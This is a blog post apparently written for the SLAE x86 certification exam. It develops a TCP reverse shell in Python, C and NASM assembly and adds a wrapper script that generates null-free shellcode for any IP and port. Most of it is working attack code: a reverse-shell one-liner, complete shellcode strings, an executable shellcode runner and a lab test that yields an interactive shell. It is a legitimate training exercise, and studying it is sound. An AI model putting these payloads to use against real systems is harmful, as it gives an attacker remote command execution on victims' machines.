---
title: "SLAE x86 Exam - Assignment #2"
date: 2021-12-19
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - x86
  - shellcode
  - assembly
  - nasm
  - c
  - exam
  - python
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 2nd assignment requires you to write shellcode for a `Reverse Shell TCP`.

There are two constraints: the **IP address** and the **TCP port number** should be **easily configurable**.

## Source Code

The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2).

List of files:

- [tcp_rev_shell.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.c): Reverse Shell written in `C`
- [tcp_rev_shell.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/tcp_rev_shell.nasm): Reverse Shell written in `Assembly`
- [automation/wrapper.py](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/wrapper.py): `python` script to automate the generation of shellcode based on arbitrary IP addresses and TCP port
- [automation/template.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/2/automation/template.nasm): generic template used by `wrapper.py`

## Implementation

Follows the visual representation of this technique:

![Implementation of Reverse Shell TCP](/assets/img/slae32/reverse_shellcode_tcp_1.jpg)
*How a TCP Reverse Shell works*

After creating a TCP socket, it connects to a specific TCP listener, identified by an `IP:PORT` pair. At that point, the program redirects input, output and error to the newly-created socket.

Finally, a shell is spawned, thus giving an interactive shell to the TCP listener the socket connected to.

The graph is based on the C code I wrote in the next chapter.

### C Code

Given that I didn't know how to write a Reverse Shell in C, first I looked for a simple one-liner in `python` (which is the closest language I'm familiar with):

```bash
python -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1", 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Let's analyze the instructions:

```py
import socket, os, pty

s = socket.socket()
s.connect(("127.0.0.1", 4444))

# s.fileno() returns the File Descriptor associated with the socket
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

pty.spawn("/bin/sh")
```

First, it creates a TCP `socket` and connects it to `127.0.0.1:4444`.

After that, it uses the function `dup2` in order to redirect `stdin`, `stdout`, and `stderr` towards the socket.

Finally, it executes `/bin/sh`.

Let's see if my C version works:

```cpp
#include <netinet/ip.h>

int main() {
    int client_socket_fd;

    // define an array made up of 1 value: 0
    // this way I don't have to pass NULL pointers to execve
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    // create a TCP socket
    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // connect to 127.0.0.1:4444
    // where netcat is listening
    // /bin/sh -c "nc -v -l 4444"
    client_address.sin_family = AF_INET;

    // convert the IP address to an 'in_addr' struct
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);

    // connect to the socket
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // redirect stdin/stdout/stderr to the socket
    dup2(client_socket_fd, 0);
    dup2(client_socket_fd, 1);
    dup2(client_socket_fd, 2);

    // now that the standard file descriptors are redirected
    // once we spawn /bin/sh, input/output/error are going to be bound
    //      to the socket
    execve("/bin/sh", empty, empty);
}
```

The first part is similar to the previous assignment: it creates a TCP socket using the same arguments.

However, compared to the function `bind()`, `connect()` doesn't use the value `INADDR_ANY`. Instead, it uses a specific IP address to connect to.

I discovered that you can't just do the following:

```cpp
client_address.sin_addr.s_addr = "127.0.0.1";
```

The reason resides in the definition of the [sockaddr_in](https://man7.org/linux/man-pages/man7/ip.7.html):

```cpp
struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
```

The variable `sin_addr` isn't simply a string (or a `char` array): it's an `in_addr` struct, so we need to convert the string first.

According to [this website](https://web.archive.org/web/20201128162706/https://www.gta.ufrj.br/ensino/eel878/sockets/inet_ntoaman.html), there are two options:

- `inet_addr`, an old function and theorically deprecated
- `inet_aton`, which is the recommended way

After that:

- the function `connect()` is used for connecting the newly-created socket to `127.0.0.1:4444` (a netcat listener running on the same machine)
- input/output/error is redirected to the socket through the use of the `dup2` function.

Lastly, the syscall `execve` spawns an `SH` shell.

Here's what's different from my first attempt at the `Bind Shell TCP Shellcode`: it seems you don't need to manage the reception of commands and their execution, like I did previously (in the first assignment) using the functions `recv`, and `system`.

In fact, after you correctly redirect input/output/error to the remote socket, and spawn a shell, everything else is performed automatically by the system.

### Assembly

Follows the first piece of code we need to convert into Assembly code:

```cpp
int main() {
    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
```

As for the 1st assignment, a socket can be created by means of the `socketcall` system function:

```nasm
; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; clear EAX, EBX, and ECX registers
    xor eax, eax
    mov ebx, eax
    mov ecx, eax

    ; copy 102 into EAX: socketcall() syscall
    mov al, 102

    ; 3rd argument of socket(): IPPROTO_TCP (0x6)
    mov cl, 6
    push ecx

    ; 1st argument of socketcall(): SYS_SOCKET
    ; 2nd argument of socket(): SOCK_STREAM (0x00000001)
    inc bl
    push ebx

    ; 1st argument of socket(): AF_INET
    mov cl, 2
    push ecx

    ; 2nd argument of socketcall(): pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80

    ; save server socket file descriptor
    mov esi, eax
```

As you can see, the syscall `socketcall` (n. 102, or `0x66`) calls `socket()`, to which the parameters `AF_INET`, `SOCK_STREAM`, `IPPROTO_TCP` are passed in order to create a TCP socket.

Once the socket has been created, we need to connect it to the remote server, in this case the netcat listener:

```cpp
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);

    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));
```

First *hurdle* is the `sockaddr_in` struct, which I've already covered in the 1st assignment:

```cpp
struct sockaddr_in {
  unsigned short      sin_family;
  unsigned short      sin_port;
  struct in_addr      sin_addr;
};

struct in_addr sin_addr {
  unsigned int        s_addr;
}
```

The size of the struct `sockaddr_in` is `0x10` bytes (due to padding).

Follows the assembly code regarding the creation of the aforementioned struct, and the `connect` function:

```nasm
    ; inet_aton("127.0.0.1")
    ;rol ebx, 24
    ;push ebx
    push 0x0100007f
    ;mov [esp], BYTE 127
    
    ; 0x115c -> htons(4444)
    push WORD 0x5c11

    ; 0x0002 -> AF_INET
    mov bl, 2
    push WORD bx

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of connect(): size of the struct
    ; push 16
    xor ebx, ebx
    mov bl, 16
    push ebx

    ; 2nd argument of connect(): pointer to the struct
    push ecx

    ; 1st argument of connect(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall()
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_CONNECT
    mov bl, 3

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80
```

Next, we're ready to redirect `stdin`/`stdout`/`stderr` towards the server socket.

```nasm
    ; loop counter (repeats dup2() three times)
    mov ecx, ebx

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov al, 63

    ; Client file descriptor
    mov ebx, esi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate
```

As for the previous assignment, the `loop` instruction repeats the routine `RepeatDuplicate` three times, once for `stderr` (`0x2`), `stdout` (`0x1`), and for `stdin` (`0x0`):

Finally, it spawns a shell:

```nasm
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    ; execve syscall
    xor eax, eax
    mov al, 11
    int 0x80
```

From now, every message that will be sent from the netcat listener is going to be interpreted as a command, since the file descriptors of the `shell` are redirected to those of the `socket`. 

## Automation

One of the requirements of the assignment is to be able to easily configure `IP address` and `TCP port`. For this reason, I chose to reuse the script I wrote for the first assignment, to which I've made some small changes in order to use arbitrary IP addresses too.

I won't show the whole script again, as I've already done that. I'll only cover the changes.

First, there's the `main` function. I've added another argument to the script, named `ip`:

```py
def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-ip', "--ip", help="IP address of the Bind Shell", required=True)
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    ip_address = args.ip
    tcp_port = args.port

    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, ip_address, output_file_path)
    generate_shellcode(output_file_path)
```

Other than that, I have changed the function `replace_template_values()`:

```py
def replace_template_values(template_name, tcp_port, ip_address, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)

    ip_address_bytes = [int(x) for x in ip_address.split(".")][::-1]
    
    if 0 in ip_address_bytes:
        print("[!] Found NULL byte in IP address")

        # choose a random byte from the range(1,256), excluding the bytes that make up the IP address
        random_xor_byte = random.choice(list(set(range(1,256)) - set(ip_address_bytes)))

        # encode XORing DWORD and XORed DWORD to hexadecimal
        xor_dword = (bytes([random_xor_byte]) * 4).hex()
        ip_address_xored_bytes = bytes([x ^ random_xor_byte for x in ip_address_bytes]).hex()
        
        replace_code = f"mov ebx, 0x{ip_address_xored_bytes}\n    xor ebx, 0x{xor_dword}\n    push ebx\n    xor ebx, ebx"
```

{% sidenote The function also checks for `NULL` bytes inside the IP address, `XOR`-ing the values with a random byte in case there are %}

```py
    else:
        ip_address_hex = "".join([(x).to_bytes(1, "little").hex() for x in ip_address_bytes])
        replace_code = f"push 0x{ip_address_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_IP }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)
```

When you run the script it shows you the required arguments:

```bash
python3 script.py -h

# usage: wrapper.py [-h] -p [1-65535] -ip IP -t TEMPLATE -o OUTPUT

# optional arguments:
#   -h, --help            show this help message and exit
#   -p [1-65535], --port [1-65535]
#                         TCP Port of the Bind Shell
#   -ip IP, --ip IP       IP address of the Bind Shell
#   -t TEMPLATE, --template TEMPLATE
#                         Path of the NASM template file. Example: -t /tmp/template.nasm
#   -o OUTPUT, --output OUTPUT
#                         Path of the output file. Example: -o /tmp/output.nasm
```

If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:

```bash
python3 wrapper.py -p 1234 -ip "127.0.0.1" -t ./template.nasm -o /tmp/output.nasm

# [!] Found NULL byte in IP address
# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 99 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\xbb\xa0\xdf\xdf\xde\x81\xf3\xdf\xdf\xdf\xdf\x53\x31\xdb\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
```

The python script and the `NASM` template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder [assignment/2/automation](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2/automation).

## Testing

To test that everything works correctly, I used the python script to generate the shellcode for a TCP Reverse Shell listening on `192.168.1.107:256`:

```bash
python3 wrapper.py -p 256 -ip "192.168.1.107" -t ./template.nasm -o /tmp/output.nasm

# [+] Object file generated at /tmp/output.nasm
# [+] Executable binary generated at /tmp/output
# [+] Shellcode length: 92 bytes
# [+] Shellcode:
# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
```

To test the shellcode generated by the python script, I used the following C `shellcode runner`:

```cpp
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
```

Compile and run it:

```bash
gcc -fno-stack-protector -z execstack shellcode_runner.c -o /tmp/tcp_rev_shell
/tmp/tcp_rev_shell
```

On my Kali machine, on which I previously set up a ncat listener (`sudo ncat -nvlp 256`), I received a reverse shell:

```bash
sudo nc -nvlp 256

# Ncat: Listening on :::256
# Ncat: Listening on 0.0.0.0:256
# Ncat: Connection from 192.168.1.105.
# Ncat: Connection from 192.168.1.105:60058.
# id
# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
# whoami
# rbct
```
